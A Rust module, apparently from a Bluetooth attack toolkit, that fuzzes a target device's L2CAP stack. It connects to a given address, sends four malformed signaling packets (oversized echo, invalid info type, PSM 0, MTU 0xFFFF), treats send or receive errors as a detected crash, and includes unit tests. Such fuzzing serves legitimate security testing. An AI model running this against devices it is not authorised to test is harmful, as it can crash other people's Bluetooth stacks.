//! L2CAP signaling fuzzer.
//!
//! Generates malformed L2CAP signaling packets (echo request, information
//! request, connection request, configuration request) and sends them via
//! a real L2CAP socket to stress-test the target's L2CAP state machine.

use std::time::Instant;

use super::l2cap_socket::L2capSocket;
use super::{BtAttackResult, BtAttackType, BtCapture};

// L2CAP signaling command codes
const L2CAP_ECHO_REQ: u8 = 0x08;
const L2CAP_INFO_REQ: u8 = 0x0A;
const L2CAP_CONN_REQ: u8 = 0x02;
const L2CAP_CONF_REQ: u8 = 0x04;

/// L2CAP fuzzer: generates malformed signaling packets and injects them
/// via a real L2CAP socket to stress the target's L2CAP implementation.
///
/// Fuzz vectors:
/// 1. Echo request with oversized payload
/// 2. Information request with invalid info type
/// 3. Connection request with PSM=0 (invalid)
/// 4. Configuration request with bad MTU option
pub fn run(target_addr: &str, addr_type: u8) -> BtAttackResult {
    let start = Instant::now();
    log::info!("l2cap_fuzz: targeting {} with malformed signaling packets", target_addr);

    let sock = match L2capSocket::connect(target_addr, addr_type, 1, 0x0001) {
        Ok(s) => s,
        Err(e) => {
            return BtAttackResult {
                attack_type: BtAttackType::L2capFuzz,
                target_address: target_addr.to_string(),
                target_name: None,
                success: false,
                capture: None,
                error: Some(format!("L2CAP connect failed: {}", e)),
                detail: Some("connect failed".into()),
                timestamp: start,
            };
        }
    };

    let fuzz_vectors = build_fuzz_vectors();
    let mut sent_count: usize = 0;
    let mut crash_trigger: Option<Vec<u8>> = None;

    for (name, payload) in &fuzz_vectors {
        log::info!(
            "l2cap_fuzz: sending {} ({} bytes): {:02x?}",
            name,
            payload.len(),
            &payload[..payload.len().min(32)]
        );

        match sock.send(payload) {
            Ok(_) => {
                sent_count += 1;
                // Try to receive a response — timeout or error may indicate crash.
                let mut resp = vec![0u8; 256];
                if let Err(e) = sock.recv(&mut resp, 1000) {
                    log::info!("l2cap_fuzz: recv error after {} (possible crash): {}", name, e);
                    crash_trigger = Some(payload.clone());
                }
            }
            Err(e) => {
                // Broken pipe / connection reset = possible target crash.
                log::info!("l2cap_fuzz: send error on {} (possible crash): {}", name, e);
                crash_trigger = Some(payload.clone());
                break;
            }
        }
    }

    let capture = crash_trigger.map(|trigger| BtCapture::FuzzCrash {
        address: target_addr.to_string(),
        trigger,
    });

    let total = fuzz_vectors.len();
    let crashed = capture.is_some();
    let detail = if crashed {
        format!("{}/{} sent, CRASH detected", sent_count, total)
    } else {
        format!("{}/{} sent, no crash", sent_count, total)
    };

    BtAttackResult {
        attack_type: BtAttackType::L2capFuzz,
        target_address: target_addr.to_string(),
        target_name: None,
        success: sent_count > 0,
        capture,
        error: None,
        detail: Some(detail),
        timestamp: start,
    }
}

/// Build the set of malformed L2CAP signaling packets.
fn build_fuzz_vectors() -> Vec<(&'static str, Vec<u8>)> {
    vec![
        ("echo_oversized", build_echo_oversized()),
        ("info_req_invalid", build_info_req_invalid()),
        ("conn_req_psm_zero", build_conn_req_psm_zero()),
        ("conf_req_bad_mtu", build_conf_req_bad_mtu()),
    ]
}

/// L2CAP signaling command: code(1) + id(1) + length(2) + data.
///
/// The L2CAP basic header (length + CID) is NOT included because
/// SOCK_SEQPACKET handles L2CAP framing automatically in the kernel.
fn sig_command(code: u8, id: u8, data: &[u8]) -> Vec<u8> {
    let mut pkt = Vec::with_capacity(4 + data.len());
    pkt.push(code);
    pkt.push(id);
    pkt.extend_from_slice(&(data.len() as u16).to_le_bytes());
    pkt.extend_from_slice(data);
    pkt
}

/// Echo request with 200 bytes of 0xFF — tests buffer handling.
fn build_echo_oversized() -> Vec<u8> {
    sig_command(L2CAP_ECHO_REQ, 0x01, &vec![0xFF; 200])
}

/// Information request with info_type = 0xFFFF (undefined).
fn build_info_req_invalid() -> Vec<u8> {
    sig_command(L2CAP_INFO_REQ, 0x02, &0xFFFFu16.to_le_bytes())
}

/// Connection request with PSM = 0 (invalid/reserved).
fn build_conn_req_psm_zero() -> Vec<u8> {
    let mut data = Vec::new();
    data.extend_from_slice(&0x0000u16.to_le_bytes()); // PSM: 0 (invalid)
    data.extend_from_slice(&0x0040u16.to_le_bytes()); // source CID: 0x0040
    sig_command(L2CAP_CONN_REQ, 0x03, &data)
}

/// Configuration request with absurd MTU option (0xFFFF).
fn build_conf_req_bad_mtu() -> Vec<u8> {
    let mut data = Vec::new();
    data.extend_from_slice(&0x0040u16.to_le_bytes()); // destination CID
    data.extend_from_slice(&0x0000u16.to_le_bytes()); // flags: no continuation
    // MTU option: type=0x01, length=2, value=0xFFFF
    data.push(0x01); // option type: MTU
    data.push(0x02); // option length
    data.extend_from_slice(&0xFFFFu16.to_le_bytes()); // MTU: max
    sig_command(L2CAP_CONF_REQ, 0x04, &data)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fuzz_vectors_built() {
        let vectors = build_fuzz_vectors();
        assert_eq!(vectors.len(), 4);
        for (name, payload) in &vectors {
            assert!(!name.is_empty());
            assert!(!payload.is_empty());
        }
    }

    #[test]
    fn test_sig_command_format() {
        let pkt = sig_command(L2CAP_ECHO_REQ, 0x01, &[0xAA, 0xBB]);
        // Signaling command only (no L2CAP basic header — kernel handles framing)
        assert_eq!(pkt[0], L2CAP_ECHO_REQ); // code
        assert_eq!(pkt[1], 0x01);           // id
        assert_eq!(pkt[2], 2);              // data length lo
        assert_eq!(pkt[3], 0);              // data length hi
        assert_eq!(pkt[4], 0xAA);
        assert_eq!(pkt[5], 0xBB);
        assert_eq!(pkt.len(), 6);
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_run_stub() {
        let result = run("AA:BB:CC:DD:EE:FF", 0);
        assert_eq!(result.attack_type, BtAttackType::L2capFuzz);
        assert!(result.success);
        // On the stub platform, recv always succeeds so no crash is detected.
        // capture is None when no send/recv errors occur.
        assert!(result.error.is_none());
    }
}
